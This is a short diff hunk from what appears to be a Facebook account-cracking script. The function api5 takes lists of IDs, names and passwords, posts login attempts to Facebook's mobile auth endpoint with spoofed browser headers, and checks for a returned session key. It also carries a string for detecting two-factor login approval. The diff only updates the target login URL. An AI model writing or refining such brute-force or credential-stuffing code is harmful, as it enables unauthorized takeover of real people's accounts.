@@ -978,7 +978,7 @@ def api5(ids,names,passlist):
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',}
-                        url = 'https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',/auth/login'
+                        url = 'https://m.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
